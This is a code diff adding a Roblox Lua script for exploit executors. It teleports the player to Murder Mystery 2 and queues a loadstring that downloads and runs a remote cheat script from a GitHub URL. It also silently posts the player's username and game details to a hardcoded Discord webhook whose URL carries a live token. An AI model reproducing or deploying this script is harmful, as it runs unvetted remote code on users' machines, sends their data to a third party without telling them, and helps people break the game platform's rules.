@@ -1,0 +1,152 @@
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = Players.LocalPlayer
+
+local PLACE_ID = 142823291 -- Murder Mystery 2
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1553756580212777027/TA8LpI58ALjCEDcJ-cczEUleCzQKXoy10EcsDSIFvSpzXtsSxFfhbm_C9Kis_f2thgPM"
+
+-- Script that will run after teleport
+local scriptToRun = [[
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/GurkhaHub/Mm2-Keyless/refs/heads/main/PremiumScript"))()
+]]
+
+-- Queue the script (Delta prioritized + common aliases)
+local queued = false
+
+local function tryQueue(fn)
+	if type(fn) == "function" then
+		local ok = pcall(fn, scriptToRun)
+		if ok then
+			queued = true
+			return true
+		end
+	end
+	return false
+end
+
+-- 1. Delta-specific (most common patterns)
+if delta then
+	if tryQueue(delta.queue_on_teleport) then
+		-- success
+	elseif tryQueue(delta.queueonteleport) then
+		-- success
+	elseif tryQueue(delta.QueueOnTeleport) then
+		-- success
+	end
+end
+
+-- 2. Global UNC-style functions (Delta usually supports these)
+if not queued then
+	tryQueue(queue_on_teleport)
+end
+if not queued then
+	tryQueue(queueonteleport)
+end
+if not queued then
+	tryQueue(QueueOnTeleport)
+end
+
+-- 3. Other executors (kept for compatibility)
+if not queued then
+	if syn and syn.queue_on_teleport then
+		tryQueue(syn.queue_on_teleport)
+	elseif fluxus and fluxus.queue_on_teleport then
+		tryQueue(fluxus.queue_on_teleport)
+	elseif potassium and potassium.queue_on_teleport then
+		tryQueue(potassium.queue_on_teleport)
+	elseif madium and madium.queue_on_teleport then
+		tryQueue(madium.queue_on_teleport)
+	elseif getgenv and getgenv().queue_on_teleport then
+		tryQueue(getgenv().queue_on_teleport)
+	end
+end
+
+-- Send Discord webhook log
+local function sendWebhook()
+	local gameName = "Unknown"
+	pcall(function()
+		gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+	end)
+
+	local data = {
+		embeds = {{
+			title = "External Game Execution Log",
+			color = 16753920, -- orange
+			fields = {
+				{
+					name = "Username",
+					value = player.Name,
+					inline = true
+				},
+				{
+					name = "Place ID",
+					value = tostring(game.PlaceId),
+					inline = true
+				},
+				{
+					name = "Game Name",
+					value = gameName,
+					inline = false
+				},
+				{
+					name = "Action",
+					value = queued and "Queued Teleport to MM2 (Delta)" or "Teleport to MM2 (No Queue)",
+					inline = false
+				}
+			},
+			footer = {
+				text = os.date("%A at %I:%M %p")
+			}
+		}}
+	}
+
+	local jsonData = HttpService:JSONEncode(data)
+
+	pcall(function()
+		if syn and syn.request then
+			syn.request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = jsonData
+			})
+		elseif http_request then
+			http_request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = jsonData
+			})
+		elseif request then
+			request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = jsonData
+			})
+		elseif http and http.request then
+			http.request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = jsonData
+			})
+		else
+			HttpService:PostAsync(WEBHOOK_URL, jsonData)
+		end
+	end)
+end
+
+-- Send the log
+sendWebhook()
+
+-- Teleport
+local success, err = pcall(function()
+	TeleportService:Teleport(PLACE_ID, player)
+end)
+
+if not success then
+	warn("Teleport failed:", err)
+end
